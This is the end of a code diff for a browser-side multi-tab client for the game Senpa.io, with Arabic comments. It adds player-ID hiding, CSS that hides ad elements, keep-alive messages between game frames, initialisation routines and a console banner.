+            const toggle = document.getElementById('hideIdToggle');
+            if (toggle) {
+                toggle.classList.toggle('active', state.hideId);
+            }
+            
+            // تطبيق الإخفاء على الإطارات
+            const frames = document.querySelectorAll('.game-frame');
+            frames.forEach(frame => {
+                try {
+                    const doc = frame.contentDocument || frame.contentWindow.document;
+                    if (state.hideId) {
+                        doc.body.classList.add('hide-my-id');
+                    } else {
+                        doc.body.classList.remove('hide-my-id');
+                    }
+                } catch (e) {}
+            });
+            
+            showToast(state.hideId ? 'تم إخفاء معرف اللاعب' : 'تم إظهار معرف اللاعب');
+        }
+
+        function openInstagram() {
+            window.open(CONFIG.instagramLink, '_blank');
+        }
+
+        function showToast(message) {
+            const existingToast = document.querySelector('.toast');
+            if (existingToast) existingToast.remove();
+            
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            
+            setTimeout(() => toast.remove(), 2000);
+        }
+
+        // ============ تحسينات الألعاب ============
+        function setupGameOptimizations() {
+            // إخفاء الإعلانات في الصفحة الرئيسية
+            const adStyle = document.createElement('style');
+            adStyle.id = 'adRemoverStyles';
+            adStyle.textContent = `
+                #bottomAd, #senpa-io_300x250_3, #endGame, 
+                #room-stats-hud, #socialsidebar, #preroll,
+                #gameadsbanner-container, #right-panel, #left-panel,
+                .ads-block-1, .banner, .advertisement,
+                .team-players-list, .youtube-box {
+                    display: none !important;
+                    opacity: 0 !important;
+                    pointer-events: none !important;
+                    height: 0 !important;
+                    width: 0 !important;
+                    overflow: hidden !important;
+                }
+            `;
+            document.head.appendChild(adStyle);
+        }
+
+        // ============ التهيئة ============
+        function initialize() {
+            console.log('🚀 جاري تهيئة نظام ريماس التيم...');
+            
+            // تطبيق أنظمة منع التجميد
+            preventFrameFreeze();
+            
+            // تثبيت الشاشة
+            lockScreen();
+            
+            // إعداد عداد FPS
+            initFPSCounter();
+            
+            // تحميل التبويب الأول
+            loadGame(0);
+            
+            // إعداد مستمعي الأحداث
+            document.addEventListener('keydown', handleKeyPress);
+            
+            // تحديث واجهة المستخدم
+            updateKeyBindButton();
+            updateToggles();
+            
+            // تحسينات الألعاب
+            setupGameOptimizations();
+            
+            // إعداد نظام المزامنة بين التبويبات
+            setupTabSync();
+            
+            console.log('✅ تم تهيئة النظام بنجاح');
+            console.log('📋 التبويبات:', CONFIG.maxTabs);
+            console.log('🔑 مفتاح التبديل:', state.switchKey);
+            console.log('🎮 جاهز للعب!');
+        }
+
+        function updateToggles() {
+            const instagramToggle = document.getElementById('instagramToggle');
+            const hideIdToggle = document.getElementById('hideIdToggle');
+            const lockScreenToggle = document.getElementById('lockScreenToggle');
+            
+            if (instagramToggle) instagramToggle.classList.toggle('active', state.showInstagram);
+            if (hideIdToggle) hideIdToggle.classList.toggle('active', state.hideId);
+            if (lockScreenToggle) lockScreenToggle.classList.toggle('active', state.screenLocked);
+        }
+
+        function setupTabSync() {
+            // مزامنة حالة التبويبات
+            window.addEventListener('storage', (e) => {
+                if (e.key === 'remas_switch_key') {
+                    state.switchKey = e.newValue || CONFIG.defaultKey;
+                    updateKeyBindButton();
+                }
+            });
+            
+            // الحفاظ على نشاط الإطارات في الخلفية
+            setInterval(() => {
+                state.tabs.forEach((tab, index) => {
+                    if (tab.loaded && index !== state.activeTab) {
+                        const frame = document.getElementById(`gameFrame${index}`);
+                        if (frame && frame.contentWindow) {
+                            frame.contentWindow.postMessage({ type: 'keepAlive' }, '*');
+                        }
+                    }
+                });
+            }, 5000);
+        }
+
+        // بدء التطبيق عند تحميل الصفحة
+        window.addEventListener('load', initialize);
+
+        // معالجة الأخطاء
+        window.addEventListener('error', (e) => {
+            console.error('❌ خطأ:', e.message);
+            // منع الأخطاء من إيقاف النظام
+            e.preventDefault();
         });
+
+        // تأكيد الخروج
+        window.addEventListener('beforeunload', (e) => {
+            // حفظ الحالة
+            localStorage.setItem('remas_last_active_tab', state.activeTab);
+        });
+
+        console.log(`
+        ╔══════════════════════════════════╗
+        ║   🎮 Remas Ultimate v2.0.6    ║
+        ║   ⚡ Senpa.io Multi-Tab      ║
+        ║   🔒 Screen Lock Active      ║
+        ║   🚀 Anti-Freeze System     ║
+        ║   📱 By: 6i99n              ║
+        ╚══════════════════════════════════╝
+        `);
     </script>
 </body>
 </html>
